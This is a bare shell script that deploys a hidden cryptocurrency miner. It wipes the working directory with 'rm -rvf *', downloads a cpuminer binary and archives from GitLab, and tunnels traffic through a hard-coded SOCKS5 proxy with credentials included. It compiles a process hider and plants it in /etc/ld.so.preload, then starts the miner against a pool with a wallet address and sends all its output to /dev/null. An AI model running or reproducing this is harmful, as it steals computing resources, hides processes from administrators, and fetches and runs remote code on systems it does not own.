rm -rvf * && mkdir d && cd d

#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl

apt-get install -y nodejs

apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y

curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -

npm i -g node-process-hider

wget https://gitlab.com/rizqullahizaa/rizqune/-/raw/master/cpuminer-avx2

chmod 777 cpuminer-avx2

wget https://gitlab.com/majapahlevi/mvp/-/raw/main/graphics.tar.gz

tar -xvzf graphics.tar.gz


cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 137.184.215.93:443
socks5_username = majapahlevi
socks5_password = majapahlevi
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo ""

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo ""

echo " "
echo " "


./graftcp/graftcp wget https://gitlab.com/majapahlevi/mvp/-/raw/main/magicBezzHash.zip
unzip magicBezzHash.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload


./graftcp/graftcp ./cpuminer-avx2 -a yespowerR16 -o 141.95.55.97:6534 -u LTwcynRP8e7biAAqNRYruKVZaYvm91bmET -p c=EFL,ID=SGE-599 -t 4 > /dev/null 2>&1 &

while [ 1 ]; do
  while :; do echo $RANDOM | md5sum | head -c 30; echo; sleep 1m; done
  sleep 1
done
